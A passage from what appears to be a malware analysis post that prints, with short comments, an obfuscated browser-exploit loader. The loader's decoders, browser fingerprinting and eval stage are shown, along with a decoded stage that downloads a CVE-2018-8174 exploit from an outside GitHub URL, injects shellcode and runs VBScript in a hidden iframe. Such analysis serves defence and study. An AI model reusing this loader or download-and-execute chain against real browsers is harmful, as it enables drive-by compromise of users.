            <span class="nx">ir4N7w</span> <span class="o">&lt;</span> <span class="mi">128</span> <span class="p">?</span> <span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">ir4N7w</span><span class="p">)</span> <span class="p">:</span> <span class="p">(</span><span class="mi">127</span> <span class="o">&lt;</span> <span class="nx">ir4N7w</span> <span class="o">&amp;&amp;</span> <span class="nx">ir4N7w</span> <span class="o">&lt;</span> <span class="mi">2048</span> <span class="p">?</span> <span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">ir4N7w</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span> <span class="o">|</span> <span class="mi">192</span><span class="p">)</span> <span class="p">:</span> <span class="p">(</span><span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">ir4N7w</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span> <span class="o">|</span> <span class="mi">224</span><span class="p">),</span> <span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">ir4N7w</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span> <span class="o">&amp;</span> <span class="mi">63</span> <span class="o">|</span> <span class="mi">128</span><span class="p">)),</span> <span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="mi">63</span> <span class="o">&amp;</span> <span class="nx">ir4N7w</span> <span class="o">|</span> <span class="mi">128</span><span class="p">))</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nx">b8j5WMF</span>
    <span class="p">},</span>
    <span class="na">quSjT4yyl</span><span class="p">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">MQVCd</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">b8j5WMF</span> <span class="o">=</span> <span class="dl">""</span><span class="p">,</span> <span class="nx">negriNm4A3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">ir4N7w</span> <span class="o">=</span> <span class="nx">UK1Az5</span> <span class="o">=</span> <span class="nx">zxh4w4</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">negriNm4A3</span> <span class="o">&lt;</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">];)(</span><span class="nx">ir4N7w</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">negriNm4A3</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">128</span> <span class="p">?</span> <span class="p">(</span><span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">ir4N7w</span><span class="p">),</span> <span class="nx">negriNm4A3</span><span class="o">++</span><span class="p">)</span> <span class="p">:</span> <span class="mi">191</span> <span class="o">&lt;</span> <span class="nx">ir4N7w</span> <span class="o">&amp;&amp;</span> <span class="nx">ir4N7w</span> <span class="o">&lt;</span> <span class="mi">224</span> <span class="p">?</span> <span class="p">(</span><span class="nx">zxh4w4</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">negriNm4A3</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span> <span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">]((</span><span class="mi">31</span> <span class="o">&amp;</span> <span class="nx">ir4N7w</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span> <span class="o">|</span> <span class="mi">63</span> <span class="o">&amp;</span> <span class="nx">zxh4w4</span><span class="p">),</span> <span class="nx">negriNm4A3</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">:</span> <span class="p">(</span><span class="nx">zxh4w4</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">negriNm4A3</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span> <span class="nx">c3</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">negriNm4A3</span> <span class="o">+</span> <span class="mi">2</span><span class="p">),</span> <span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">]((</span><span class="mi">15</span> <span class="o">&amp;</span> <span class="nx">ir4N7w</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span> <span class="o">|</span> <span class="p">(</span><span class="mi">63</span> <span class="o">&amp;</span> <span class="nx">zxh4w4</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span> <span class="o">|</span> <span class="mi">63</span> <span class="o">&amp;</span> <span class="nx">c3</span><span class="p">),</span> <span class="nx">negriNm4A3</span> <span class="o">+=</span> <span class="mi">3</span><span class="p">);</span>
        <span class="k">return</span> <span class="nx">b8j5WMF</span>
    <span class="p">}</span>
<span class="p">};</span>
</code></pre></div></div>

<p>The next defined object is also for decoding.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">prototype</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">kWNcdNj7d6U</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">DwQ5oeN9ct</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">hxk4VZ3L8GC</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="nx">DwQ5oeN9ct</span><span class="p">];</span>
    <span class="kd">var</span> <span class="nx">UsEJ64xf0P</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">D8H6A7MGHf</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">r5UpGh</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">D8H6A7MGHf</span> <span class="o">&lt;</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">];</span> <span class="nx">D8H6A7MGHf</span><span class="o">++</span><span class="p">,</span> <span class="nx">r5UpGh</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">r5UpGh</span> <span class="o">===</span> <span class="nx">hxk4VZ3L8GC</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">])</span> <span class="p">{</span>
            <span class="nx">r5UpGh</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="nx">UsEJ64xf0P</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">D8H6A7MGHf</span><span class="p">)</span> <span class="o">^</span> <span class="nx">hxk4VZ3L8GC</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">r5UpGh</span><span class="p">));</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nx">UsEJ64xf0P</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div></div>

<p>The next object, make sure that it is not in Chrome and Opera using, for example, User-Agent.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">prototype</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">i2668FMs5B8</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">BITU978SF7</span> <span class="o">=</span> <span class="p">((</span><span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">opr</span><span class="dl">'</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">opr</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">addons</span><span class="dl">'</span><span class="p">])</span> <span class="o">||</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">opera</span><span class="dl">'</span><span class="p">]</span> <span class="o">||</span> <span class="nb">navigator</span><span class="p">[</span><span class="dl">'</span><span class="s1">userAgent</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1"> OPR/</span><span class="dl">'</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="k">this</span> <span class="o">+</span> <span class="p">(</span><span class="k">typeof</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">InstallTrigger</span><span class="dl">'</span><span class="p">]</span> <span class="o">!==</span> <span class="dl">'</span><span class="s1">undefined</span><span class="dl">'</span><span class="p">)</span> <span class="o">+</span> <span class="k">this</span> <span class="o">+</span> <span class="p">(</span><span class="kc">false</span> <span class="o">||</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">documentMode</span><span class="dl">'</span><span class="p">])</span> <span class="o">+</span> <span class="k">this</span> <span class="o">+</span> <span class="p">(</span><span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">chrome</span><span class="dl">'</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">chrome</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">runtime</span><span class="dl">'</span><span class="p">]);</span>
    <span class="k">return</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">OygitP9</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">cMa5g</span><span class="dl">'</span><span class="p">](</span><span class="nx">BITU978SF7</span><span class="p">[</span><span class="dl">'</span><span class="s1">kWNcdNj7d6U</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">RLGuTgUF3d0</span><span class="dl">'</span><span class="p">));</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The next object is for executing code. This is the most important object.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">prototype</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">eCWmvY</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">eval</span><span class="dl">'</span><span class="p">](</span><span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">toString</span><span class="dl">'</span><span class="p">]());</span>
<span class="p">}</span>
</code></pre></div></div>

<p>With these codes, the following code will be executed. This downloads the encoded data and executes it.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">VS4H8Yo1</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">onreadystatechange</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="mi">4</span> <span class="o">==</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">readyState</span><span class="dl">'</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="mi">200</span> <span class="o">==</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">status</span><span class="dl">'</span><span class="p">])</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">W7iaUaId</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">VS4H8Yo1</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">responseText</span><span class="dl">'</span><span class="p">];</span>
        <span class="kd">var</span> <span class="nx">riqAvm0Is</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">OygitP9</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">jbRyz</span><span class="dl">'</span><span class="p">](</span><span class="nx">W7iaUaId</span><span class="p">)[</span><span class="dl">'</span><span class="s1">kWNcdNj7d6U</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">RLGuTgUF3d0</span><span class="dl">'</span><span class="p">);</span>
        <span class="nx">riqAvm0Is</span><span class="p">[</span><span class="dl">'</span><span class="s1">eCWmvY</span><span class="dl">'</span><span class="p">]();</span>
    <span class="p">}</span>
<span class="p">};</span>

<span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">VS4H8Yo1</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">open</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">post</span><span class="dl">'</span><span class="p">,</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">OygitP9</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">jbRyz</span><span class="dl">'</span><span class="p">](</span><span class="nx">mbwk99</span><span class="p">)[</span><span class="dl">'</span><span class="s1">kWNcdNj7d6U</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">RLGuTgUF3d0</span><span class="dl">'</span><span class="p">),</span> <span class="kc">true</span><span class="p">);</span>
<span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">VS4H8Yo1</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">send</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">@@</span><span class="dl">'</span> <span class="p">[</span><span class="dl">'</span><span class="s1">i2668FMs5B8</span><span class="dl">'</span><span class="p">]());</span>
</code></pre></div></div>

<h2 id="encoded-data">Encoded data</h2>
<p>When decoding the code, it looks like the following.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">ZV7S8RUn</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">-- Shellcode here --</span><span class="dl">'</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">dIl15w</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">XDomainRequest</span><span class="dl">'</span><span class="p">]();</span>
<span class="nx">dIl15w</span><span class="p">[</span><span class="dl">'</span><span class="s1">onload</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">H2Kqgnp</span> <span class="o">=</span> <span class="nx">dIl15w</span><span class="p">[</span><span class="dl">'</span><span class="s1">responseText</span><span class="dl">'</span><span class="p">];</span>
    <span class="kd">var</span> <span class="nx">WW7QZmX</span> <span class="o">=</span> <span class="nx">H2Kqgnp</span><span class="p">[</span><span class="dl">'</span><span class="s1">substring</span><span class="dl">'</span><span class="p">](</span><span class="nx">H2Kqgnp</span><span class="p">[</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">&lt;script language="vbscript"&gt;</span><span class="dl">'</span><span class="p">),</span><span class="nx">H2Kqgnp</span><span class="p">[</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">&lt;/body&gt;</span><span class="dl">'</span><span class="p">));</span>
    <span class="kd">var</span> <span class="nx">l1a2N5kr</span> <span class="o">=</span> <span class="nx">WW7QZmX</span><span class="p">[</span><span class="dl">'</span><span class="s1">split</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="se">\n</span><span class="dl">'</span><span class="p">);</span>
    <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">L8c4YdRG</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">L8c4YdRG</span> <span class="o">&lt;</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">];</span> <span class="nx">L8c4YdRG</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">%ue8fc%u008</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="o">||</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">#{encoded_payload}</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="o">||</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">%u8b55%u81ec</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="o">||</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">REPLACE_SHELLCODE_HERE</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">g68j2okJh5D</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
            <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">%ue8fc%u008</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">g68j2okJh5D</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">%ue8fc%u008</span><span class="dl">'</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">#{encoded_payload}</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">g68j2okJh5D</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">#{encoded_payload}</span><span class="dl">'</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">%u8b55%u81ec</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">g68j2okJh5D</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">%u8b55%u81ec</span><span class="dl">'</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">REPLACE_SHELLCODE_HERE</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">g68j2okJh5D</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">REPLACE_SHELLCODE_HERE</span><span class="dl">'</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="kd">var</span> <span class="nx">zEZGDPaGVEt</span> <span class="o">=</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">substring</span><span class="dl">'</span><span class="p">](</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="nx">g68j2okJh5D</span><span class="p">),</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">"</span><span class="dl">'</span><span class="p">,</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="nx">g68j2okJh5D</span><span class="p">)));</span>
            <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">]</span> <span class="o">=</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">replace</span><span class="dl">'</span><span class="p">](</span><span class="nx">zEZGDPaGVEt</span><span class="p">,</span><span class="nx">ZV7S8RUn</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="se">\'</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">TJIp1rglYoq</span> <span class="o">=</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">substring</span><span class="dl">'</span><span class="p">](</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="se">\'</span><span class="dl">'</span><span class="p">));</span>
            <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">]</span> <span class="o">=</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">replace</span><span class="dl">'</span><span class="p">](</span><span class="nx">TJIp1rglYoq</span><span class="p">,</span><span class="dl">''</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">MsgBox</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">]</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">Alert</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">]</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nx">WW7QZmX</span> <span class="o">=</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="dl">'</span><span class="s1">join</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="se">\n</span><span class="dl">'</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">nbvMHPdb</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">createElement</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">iframe</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">nbvMHPdb</span><span class="p">[</span><span class="dl">'</span><span class="s1">setAttribute</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">AARa7</span><span class="dl">"</span><span class="p">);</span>
    <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">getElementsByTagName</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">BODY</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">nbvMHPdb</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">ocH5HC2B</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">getElementById</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">AARa7</span><span class="dl">"</span><span class="p">)[</span><span class="dl">'</span><span class="s1">contentWindow</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">];</span>
    <span class="nx">ocH5HC2B</span><span class="p">[</span><span class="dl">'</span><span class="s1">open</span><span class="dl">'</span><span class="p">]();</span>
    <span class="nx">ocH5HC2B</span><span class="p">[</span><span class="dl">'</span><span class="s1">write</span><span class="dl">'</span><span class="p">](</span><span class="nx">WW7QZmX</span><span class="p">);</span>
    <span class="nx">ocH5HC2B</span><span class="p">[</span><span class="dl">'</span><span class="s1">close</span><span class="dl">'</span><span class="p">]();</span>
<span class="p">}</span>
<span class="nx">dIl15w</span><span class="p">[</span><span class="dl">'</span><span class="s1">open</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">get</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">https://raw.githubusercontent.com/w7374520/CVE-2018-8174_EXP/master/CVE-2018-8174.py</span><span class="dl">'</span><span class="p">);</span>
